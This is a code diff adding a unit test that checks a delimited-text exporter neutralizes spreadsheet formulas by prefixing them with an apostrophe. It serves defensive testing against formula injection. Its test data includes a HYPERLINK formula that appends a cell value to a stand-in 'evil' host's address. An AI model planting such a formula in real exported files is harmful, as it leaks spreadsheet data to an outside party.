@@ -24,3 +24,18 @@ describe('toDelimited', () => {
     expect(toDelimited(['a'], [[null]], ',')).toBe('a\n');
   });
 });
+
+describe('toDelimited formula neutralization (M4)', () => {
+  it('exports =HYPERLINK(...) as text, in header and data, while numbers stay numbers', () => {
+    const tsv = toDelimited(
+      ['=evil', 'amount'],
+      [['=HYPERLINK("http://evil/?"&A1,"Click")', '-5'], ['@SUM(A1)', '+1.5']],
+      '\t',
+    );
+    expect(tsv).toBe(
+      "'=evil\tamount\n" +
+      `"'=HYPERLINK(""http://evil/?""&A1,""Click"")"\t-5\n` +
+      "'@SUM(A1)\t+1.5",
+    );
+  });
+});
